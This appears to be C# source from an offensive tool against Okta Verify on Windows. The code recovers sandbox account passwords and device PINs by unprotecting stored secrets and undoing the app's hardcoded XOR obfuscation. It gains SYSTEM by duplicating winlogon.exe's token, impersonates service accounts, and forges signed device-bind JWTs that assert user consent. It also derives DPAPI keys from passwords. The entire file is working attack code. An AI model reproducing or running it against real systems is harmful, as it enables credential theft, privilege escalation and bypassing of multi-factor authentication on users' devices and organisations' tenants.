using System.Runtime.InteropServices;
using System;
using System.Security.Cryptography;
using System.Text;
using System.Collections.Generic;
using JWT.Algorithms;
using OktaTerrify.Signers;
using JWT;
using JWT.Builder;
using System.Reflection;
using System.Security.Principal;
using NtApiDotNet.Win32;
using NtApiDotNet;
using Microsoft.Win32.SafeHandles;
using System.IO;
using System.Linq;
using NtApiDotNet.Utilities.Security;
using PBKDF2;
using OktaCommon.DPAPI;
using System.Text.RegularExpressions;
using System.Diagnostics.Eventing.Reader;
using System.Runtime.Remoting;

namespace OktaCommon {
    public class OktaCrypto {

           class SafeNCryptDescriptorHandle : SafeHandleZeroOrMinusOneIsInvalid {

            public SafeNCryptDescriptorHandle(IntPtr preexistingHandle, bool ownsHandle) : base(ownsHandle) {
                SetHandle(preexistingHandle);
            }

            public SafeNCryptDescriptorHandle() : base(true) {
            }

            [DllImport("NCrypt.dll", CharSet = CharSet.Unicode, SetLastError = true)]
            static extern uint NCryptCloseProtectionDescriptor(IntPtr hDescriptor);
     
            protected override bool ReleaseHandle() {
                if (!IsInvalid) {
                    uint result = NCryptCloseProtectionDescriptor(handle);
                    handle = IntPtr.Zero; 
                    return result == 0;
                }
                return true;                
            }
        }

        [DllImport("NCrypt.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern uint NCryptCreateProtectionDescriptor(
            string pwszDescriptorString,
            uint dwFlags,
            out SafeNCryptDescriptorHandle phDescriptor
        );

        [DllImport("NCrypt.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern uint NCryptUnprotectSecret(
            SafeNCryptDescriptorHandle phDescriptor,
            uint dwFlags,
            byte[] pbProtectedBlob,
            ulong cbProtectedBlob,
            IntPtr pMemPara,
            IntPtr hWnd,
            out IntPtr ppbData,
            out uint pcbData
        );       

        static readonly byte[] xorKey = { 0x8a, 0x7f, 0x96, 0xf5, 0xac, 0xb0, 0x3c, 0x8f, 0xcb, 0xb0, 0xc9, 0x79, 0xc6, 0xb5, 0x9e, 0x63, 0x4a, 0x28, 0x24, 0xb7, 0xfd, 0x45, 0xb8, 0x46, 0x39, 0xe3, 0x8a, 0x28, 0x59, 0x59, 0xd4, 0x7e, 0x41, 0xcc, 0x74, 0xb7, 0xae, 0xe7, 0x64, 0x02, 0x7c, 0x30, 0x61, 0x4c, 0x10, 0x6a, 0x9b, 0xfb, 0x34, 0x79, 0x11, 0x32, 0xde, 0x0f, 0x0c, 0xeb, 0x2d, 0xf6, 0x1c, 0xae, 0x11, 0xa7, 0xd0, 0x18 };
        //static readonly byte[] xorKey = { 0xad, 0xfa, 0x29, 0x0a, 0x18, 0x5f, 0x90, 0x93, 0x69, 0x38, 0xa8, 0xa2, 0x53, 0x12, 0xbc, 0xbb, 0x01, 0x88, 0x45, 0x5b, 0x67, 0x96, 0x3e, 0x31, 0x07, 0x71, 0xe1, 0x96, 0x19, 0xd6, 0x53, 0x25, 0xa4, 0x7b, 0xea, 0xbb, 0xd3, 0xd4, 0x50, 0xbc, 0xd8, 0x7f, 0xda, 0xae, 0x93, 0x04, 0x7f, 0x95, 0x8b, 0xa1, 0x4c, 0x3a, 0x10, 0xdb, 0xa3, 0xb4, 0x74, 0xa6, 0x4b, 0xa9, 0x27, 0x93, 0x62, 0xad };
        
        public static byte OktaXor(byte value) {
            value = (byte)((value & 0xfd) << 5 | value >> 5 & 5 | value & 0x5a);
            value = (byte)((value >> 1 ^ value * '\x02') & 0x55 ^ value * '\x02');
            return (byte)((value & 0xf5) << 3 | value >> 3 & 0x15 | value & 0x42);
        }

        public static byte OktaXorPwd(byte value) {
            value = (byte)((value & 0xf5) << 3 | value >> 3 & 0x15 | value & 0x42);
            value = (byte)((value >> 1 ^ value * '\x02') & 0x55 ^ value * '\x02');
            return (byte)((value & 0xfd) << 5 | value >> 5 & 5 | value & 0x5a);
        }

        public static byte[] OktaHashNG(byte[] data) {
            for (int idx = 0; idx < data.Length; idx++) {
                data[idx] = (byte)(data[idx] ^ xorKey[((data.Length - idx) - 1) & 0x3f]);
            }

            if (data.Length < 4) {
                for (int i = 0; i < data.Length; ++i) {
                    data[i] = OktaXorPwd(data[i]);
                }
            } else {

                var remainder = data.Length % 3;

                if (remainder >= 1) {
                    data[0] = OktaXorPwd(data[0]);
                }

                if (remainder == 2) {
                    data[1] = OktaXorPwd(data[1]);
                }

                int idx = remainder;

                while (idx < data.Length) {

                    var first = data[idx];
                    var second = data[idx + 1];
                    var third = data[idx + 2];

                    data[idx] = OktaXorPwd((byte)((second ^ third) & 0xf ^ second));
                    data[idx + 1] = OktaXorPwd((byte)((first ^ third) & 0xf ^ third));
                    data[idx + 2] = OktaXorPwd((byte)((first ^ second) & 0xf ^ first));

                    idx += 3;
                }
            }

            return data;
        }

        public static string OktaHashPwd(byte[] data) {
            for (int idx = 0; idx < data.Length; idx++) {
                data[idx] = (byte)(data[idx] ^ xorKey[((data.Length - idx) - 1) & 0x3f]);
            }

            if (data.Length < 4) {
                for (int i = 0; i < data.Length; ++i) {
                    data[i] = OktaXorPwd(data[i]);
                }
            } else {

                var remainder = data.Length % 3;

                if (remainder >= 1) {
                    data[0] = OktaXorPwd(data[0]);
                }

                if (remainder == 2) {
                    data[1] = 0; // OktaXorPwd(data[1]);
                }

                int idx = remainder;

                while (idx < data.Length) {

                    var first = data[idx];
                    var second = data[idx + 1];
                    var third = data[idx + 2];

                    if (idx % 2 == 0) {
                        data[idx] = OktaXorPwd((byte)((second ^ third) & 0xf ^ second));
                        data[idx + 1] = 0; //OktaXorPwd((byte)((first ^ third) & 0xf ^ third));
                        data[idx + 2] = OktaXorPwd((byte)((first ^ second) & 0xf ^ first));
                    } else {
                        data[idx] = 0; //  OktaXorPwd((byte)((second ^ third) & 0xf ^ second));
                        data[idx + 1] = OktaXorPwd((byte)((first ^ third) & 0xf ^ third));
                        data[idx + 2] = 0; //OktaXorPwd((byte)((first ^ second) & 0xf ^ first));
                    }

                    idx += 3;
                }
            }

            //The official Okta Verify app XOR's every second character (the NULL's of a Unicode string)
            //of the secret with the sequence derived from the following algorithm Base64(SHA256(SID_STRING)).
            //But since the generated passwords are limited to the ASCII character set, we already know
            //that every 2nd byte will be NULL, so we just do that above instead.

            return Encoding.Unicode.GetString(data, 0, data.Length - 2);
        }
        public static byte[] OktaHash(byte[] data) {

            if (data.Length < 4) {
                for (int i = 0; i < data.Length; ++i) {
                    data[i] = OktaXor(data[i]);
                }
            } else {

                var remainder = data.Length % 3;

                if (remainder >= 1) {
                    data[0] = OktaXor(data[0]);
                }

                if (remainder == 2) {
                    data[1] = OktaXor(data[1]);
                }

                int idx = remainder;

                while (idx < data.Length) {

                    var first = OktaXor(data[idx]);
                    var second = OktaXor(data[idx + 1]);
                    var third = OktaXor(data[idx + 2]);

                    data[idx] = (byte)((third ^ second) & 0xf ^ third);
                    data[idx + 1] = (byte)((third ^ first) & 0xf ^ first);
                    data[idx + 2] = (byte)((second ^ first) & 0xf ^ second);

                    idx += 3;
                }
            }

            for (int idx = 0; idx < data.Length; idx++) {
                data[idx] = (byte)(data[idx] ^ xorKey[((data.Length - idx) - 1) & 0x3f]);
            }
            
            var sha256 = SHA256.Create();
            sha256.TransformFinalBlock(data, 0, data.Length);
            return sha256.Hash;            
        }

        public static string GetSandboxUserPassword(byte[] identifier) {

            SafeNCryptDescriptorHandle phDescriptor;
            IntPtr ppbDataPtr;
            uint pcbData;

            var status = NCryptCreateProtectionDescriptor("LOCAL=user", 0, out phDescriptor);
            if (status != 0) {
                throw new Exception($"Failed to open protection descriptor, error: 0x{status:x}");
            }

            using (phDescriptor) { 
                status = NCryptUnprotectSecret(phDescriptor, 0x40, identifier, (uint)identifier.Length, IntPtr.Zero, IntPtr.Zero, out ppbDataPtr, out pcbData);
                if (status != 0) {
                    throw new Exception($"Failed to unprotect secret protection descriptor, error: 0x{status:x}");
                }
            }

            byte[] secret = new byte[pcbData];
            Marshal.Copy(ppbDataPtr, secret, 0, secret.Length);

            return OktaHashPwd(secret);
        }

        public static string GenerateClientName(string sid) {
            var sidBytes = Encoding.UTF8.GetBytes(sid);
            var sha256 = SHA256.Create();
            sha256.TransformFinalBlock(sidBytes, 0, sidBytes.Length);
            return Convert.ToBase64String(sha256.Hash);
        }

        public static byte[] GetSystemPin(byte[] identifier, string clientName) {

          
            SafeNCryptDescriptorHandle phDescriptor;
            IntPtr ppbDataPtr;
            uint pcbData;

            var status = NCryptCreateProtectionDescriptor("LOCAL=user", 0, out phDescriptor);
            if (status != 0) {
                throw new Exception($"Failed to open protection descriptor, error: 0x{status:x}");
            }

            using (phDescriptor) {
                status = NCryptUnprotectSecret(phDescriptor, 0x40, identifier, (uint)identifier.Length, IntPtr.Zero, IntPtr.Zero, out ppbDataPtr, out pcbData);
                if (status != 0) {
                    throw new Exception($"Failed to unprotect secret protection descriptor, error: 0x{status:x}");
                }
            }

            byte[] secret = new byte[pcbData];
            Marshal.Copy(ppbDataPtr, secret, 0, secret.Length);
       
            secret = OktaHashNG(secret);
            var secretXorKey = Encoding.Unicode.GetBytes(clientName);

            for (int idx = 0; idx < secret.Length; idx++) {
                int xorOffset = (secret.Length - idx) - 1;
                secret[idx] = (byte)(secret[idx] ^ secretXorKey[xorOffset % ((clientName.Length * 2 + 2) - 1)]);
            }

            return secret;
        }

        public static string BuildDeviceAttestationJwt(Key key, string audience, string issuer, string subject, string impersonate) {

            //There seems to be a bug in old Okta Verify enrolments where the 
            //device attestation key id contains the SID of the sandbox but
            //was created under the primary account.  So we work around this
            //by trying all variations 

            var dateTimeProvider = new UtcDateTimeProvider();
            var issueTime = DateTime.UtcNow;
            ThreadImpersonationContext impersonationContext = null;
            bool useSandbox = false;
            string sid = null;

            do {

                try {
                    
                    if (impersonate != null && useSandbox) {
                        impersonationContext = ImpersonateSandbox(impersonate);
                        sid = WindowsIdentity.GetCurrent().User.ToString();
                    } else {
                        sid = WindowsIdentity.GetCurrent().User.ToString();
                    }

                    var result = JwtBuilder.Create()
                               .AddHeader("kid", key.KeyId)  //device key id
                               .AddHeader("typ", "JWT")
                               .Id(Guid.NewGuid())
                               .Audience(audience) //tenant URL
                               .Subject(subject) //deviceId
                               .Issuer(issuer) //clientInstanceId                               
                               .IssuedAt(issueTime)
                               .NotBefore(issueTime.AddMinutes(-1))
                               .ExpirationTime(issueTime.AddMinutes(5))
                               .AddClaim("kid", key.KeyId)
                               .WithAlgorithm(new CngRSAAlgorithm(File.Exists($"{key.KeyId}.key"), null))
                               .WithDateTimeProvider(dateTimeProvider)
                               .WithSecret(new string[] { key.Path == null ? $"{sid}//{Identifiers.OktaClientId}//{key.KeyId}" : key.Path })
                               .Encode();

                    return result;
                    
                } catch (CryptographicException) {

                    if (!useSandbox) {
                        if (impersonate != null) {
                            useSandbox = true;
                            continue;
                        } else {
                            throw;
                        }
                    } else {

                        if (impersonationContext != null) {
                            impersonationContext.Revert();

                            return JwtBuilder.Create()
                                         .AddHeader("kid", key.KeyId)  //device key id
                                         .AddHeader("typ", "JWT")
                                         .Id(Guid.NewGuid())
                                         .Audience(audience) //tenant URL
                                         .Subject(subject) //deviceId
                                         .Issuer(issuer) //clientInstanceId                               
                                         .IssuedAt(issueTime)
                                         .NotBefore(issueTime.AddMinutes(-1))
                                         .ExpirationTime(issueTime.AddMinutes(5))
                                         .AddClaim("kid", key.KeyId)
                                         .WithAlgorithm(new CngRSAAlgorithm(File.Exists($"{key.KeyId}.key"), null))
                                         .WithDateTimeProvider(dateTimeProvider)
                                         .WithSecret(new string[] { key.Path == null ? $"{sid}//{Identifiers.OktaClientId}//{key.KeyId}" : key.Path })
                                         .Encode();
                        }

                        throw;
                    }                    
                }
            } while (true);
        }

        static NtToken DuplicateProcessToken(NtProcess process) {
            
            var result = process.OpenToken(TokenAccessRights.Duplicate | TokenAccessRights.GenericRead, false);
            
            if (result.IsSuccess)
                return result.Result.DuplicateToken(SecurityImpersonationLevel.Impersonation);
            else {
                Console.WriteLine($"[!] Failed to open process token {process.Name} ({ process.ProcessId}) ");
                return null;
            }
        }

        static NtToken GetSystem(string sandboxUser) {

            NtToken result;

            if (!NtToken.EnableEffectivePrivilege(TokenPrivilegeValue.SeDebugPrivilege) || !NtToken.EnableEffectivePrivilege(TokenPrivilegeValue.SeImpersonatePrivilege)) {
                throw new UnauthorizedAccessException("[!] Failed to get privileges when trying to gain SYSTEM");
            }

            var systemToken = DuplicateProcessToken(NtProcess.GetProcesses(ProcessAccessRights.DupHandle | ProcessAccessRights.QueryInformation).First(p => p.Name.Equals("winlogon.exe", StringComparison.OrdinalIgnoreCase)));

            if(sandboxUser != "SYSTEM") {
                using (var ctx = systemToken.Impersonate()) {
                    if (sandboxUser == "LocalService") {
                        result = NtProcess.GetProcesses(ProcessAccessRights.AllAccess)
                            .Where(p => p.OpenToken().User.Sid == KnownSids.LocalService)
                            .Select(p => DuplicateProcessToken(p))
                            .Where(t => t != null)
                            .First();
                    } else if (sandboxUser == "NetworkService") {
                        result = NtProcess.GetProcesses(ProcessAccessRights.AllAccess)
                            .Where(p => p.OpenToken().User.Sid == KnownSids.NetworkService)
                            .Select(p => DuplicateProcessToken(p))
                            .Where(t => t != null)
                            .First();
                    } else if(sandboxUser == "Ngc") {
                        result = NtProcess.GetProcesses(ProcessAccessRights.AllAccess)
                            .Select(p => p.OpenToken())
                            .Where(t => t.User.Sid == KnownSids.LocalService && t.Groups.Any(g => g.Name == "NT SERVICE\\NgcCtnrSvc"))
                            .First().DuplicateToken(SecurityImpersonationLevel.Impersonation);
                    } else {
                        throw new ArgumentException("Only SYSTEM, LocalService or NetworkService can be used");
                    }
                }
            } else {
                result = systemToken;
            }     

            return result;         
        }

        public static ThreadImpersonationContext ImpersonateSandbox(string impersonate) {

            if(impersonate == null)
                throw new ArgumentNullException(nameof(impersonate));
            
            var sandboxCredential = impersonate.Split(new char[] { ':' });
            var sandboxUser = sandboxCredential[0];
            NtToken impersonateToken;
            string[] systemAccounts = new string[] { "SYSTEM", "LocalService", "NetworkService", "Ngc"};

            //We need to load assemblies that are triggered under impersonation because
            //often the DLL's might be in a location where the impersonated user doesn't
            //have read access
            Assembly.Load("JWT");
            Assembly.Load("System.Text.Json");
            Assembly.Load("System.Memory");
            Assembly.Load("Microsoft.Bcl.AsyncInterfaces");
            Assembly.Load("System.Threading.Tasks.Extensions");
            Assembly.Load("System.Text.Encodings.Web");
            Assembly.Load("System.Buffers");
            Assembly.Load("System.Collections.Immutable");
            Assembly.Load("Dahomey.Cbor");
            Assembly.Load("Newtonsoft.Json");

            if (systemAccounts.Count(s => s.Equals(sandboxUser, StringComparison.OrdinalIgnoreCase)) == 0) {
                var sandboxPassword = GetSandboxUserPassword(Convert.FromBase64String(sandboxCredential[1]));

                Console.WriteLine($"[=] Attempting to impersonate sandbox account {sandboxUser}:{sandboxPassword}");

#pragma warning disable CS0618 // Type or member is obsolete
                impersonateToken = LogonUtils.Logon(sandboxUser, ".", sandboxPassword, SecurityLogonType.Interactive)
                    .DuplicateToken(SecurityImpersonationLevel.Impersonation);
#pragma warning restore CS0618 // Type or member is obsolete


            }else{
                impersonateToken = GetSystem(sandboxUser);              
            }

            var impersonationContext = impersonateToken.Impersonate();
            return impersonationContext;            
        }

        public static string BuildDeviceBindJwt(string tx, string nonce, string sid, string oauthClientId, Key key,
                                    string userId, string deviceId, string methodEnrollmentId, 
                                    string audience, bool userVerification, IAsymmetricAlgorithm signer, string keyType) {

            var algorithm = signer;
            var dateTimeProvider = new UtcDateTimeProvider();
            var issueTime = DateTime.UtcNow;
            var amrType = userVerification ? "user" : "hwk";
            var fullKey = Regex.Match(key.KeyId, ".*//.*//(.*)");

            return JwtBuilder.Create()
                .AddHeader("kid", key.KeyId)  // key id from database
                .AddHeader("typ", "okta-devicebind+jwt")

                .Audience(audience)  //tenant URL
                .Subject(userId) //userId
                .Issuer(deviceId) //deviceId from database                               
                .IssuedAt(issueTime)
                .NotBefore(issueTime.AddMinutes(-1))
                .ExpirationTime(issueTime.AddMinutes(5))
                .AddClaim("amr", new string[] { amrType })
                .AddClaim("integrations", new string[] { })
                .AddClaim("keyType", keyType)
                .AddClaim("methodEnrollmentId", methodEnrollmentId) //from AuthenticaorVerificationMethod table
                .AddClaim("nonce", nonce)  //from the challenge JWT?
                .AddClaim("tx", tx)
                .AddClaim("deviceSignals", new Dictionary<string, string> {                    
                })
                .AddClaim("challengeResponseContext", new Dictionary<string, object> {
                    { "bindingType","LOOPBACK"},
                    { "userConsent", "APPROVED_CONSENT_PROMPT"},
                    { "originHeader", audience }
                })

                .WithAlgorithm(algorithm)
                .WithDateTimeProvider(dateTimeProvider)
                .WithSecret(new string[] { (key.Path == null ? (fullKey.Success ? key.KeyId : $"{sid}//{oauthClientId}//{key.KeyId}") : key.Path) })
                .Encode();
        }

        public static string PerformingSigning(string tx, string nonce, Key key, string userId, string deviceId, string methodEnrollmentId, 
                                                string audience, string impersonate, bool userVerification, IAsymmetricAlgorithm signer, string keyType, bool quiet = true) {


            ThreadImpersonationContext impersonationContext = null;

            if (impersonate != null) {
                impersonationContext = ImpersonateSandbox(impersonate);
            }

            var sid = WindowsIdentity.GetCurrent().User.ToString();

            var jwt = BuildDeviceBindJwt(tx, nonce, sid, Identifiers.OktaClientId, key, userId, deviceId,
                methodEnrollmentId, audience, userVerification, signer, keyType);

            if (impersonationContext != null)
                impersonationContext.Revert();

            if (!quiet) {
                Console.WriteLine($"Signed JWT for transaction id {tx} with nonce {nonce} using TPM key with {key.KeyId}");
            }
            return jwt;
        }

        static string ReadNcgFileString(string path) {
            var fileData = File.ReadAllBytes(path);
            return  Encoding.Unicode.GetString(fileData.Take(fileData.Length - 2).ToArray());
        }

        static CNGKeyBlob FindCngKey(string keyId, string cngKeysFolder) {

            var keyFiles = Directory.EnumerateFiles(cngKeysFolder);
            var fullKeyId = $"{WindowsIdentity.GetCurrent().User}//{Identifiers.OktaClientId}//{keyId}";

            foreach (var keyFile in keyFiles) {
                try {
                    var cngKey = CNGKeyBlob.Parse(new BinaryReader(new MemoryStream(File.ReadAllBytes(keyFile))));
                    if (cngKey.Name == keyId || cngKey.Name == fullKeyId) {
                        return cngKey;
                    }
                } catch (FormatException) {

                }
            }

            return null;
        }

        public static CNGKey FindCngCryptoFileByKeyId(string keyId, string impersonate) {

            CNGKeyBlob blob = null;
            ushort pinLength = 0;
  
            ThreadImpersonationContext impersonationContext = null;
            if (impersonate != null) {
                impersonationContext = ImpersonateSandbox(impersonate);
            }
                
            blob = FindCngKey(keyId, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Crypto\Keys"));

            if (impersonationContext != null)
                impersonationContext.Revert();         

            if(blob != null) {
                return new CNGKey() {
                    KeyBlob = blob,
                    PinLength = pinLength
                };
            } else {
                return null;
            }  
        }

        public static byte[] DeriveKeyFromPassword(string sid, string password, bool domainUser) {

            var encodedSidNull = Encoding.Unicode.GetBytes(sid + "\0");
            var encodedSid = encodedSidNull.Take(encodedSidNull.Length - 2).ToArray();
            byte[] hmacData = null;

            if (!domainUser) {

                using (var sha1 = new SHA1Managed()) {
                    hmacData = sha1.ComputeHash(Encoding.Unicode.GetBytes(password));
                }

            } else {

                var ntHash = MD4.CalculateHash(Encoding.Unicode.GetBytes(password));

                using (var hmac256 = new HMACSHA256()) {
                    hmacData = new Pbkdf2(hmac256, new Pbkdf2(hmac256, ntHash, encodedSid, 10000)
                        .GetBytes(32, "sha256"), encodedSid, 1)
                        .GetBytes(16, "sha256");
                }
            }

            using (var hmac = new HMACSHA1(hmacData)) {
                return hmac.ComputeHash(encodedSidNull);
            }
        }
    }
}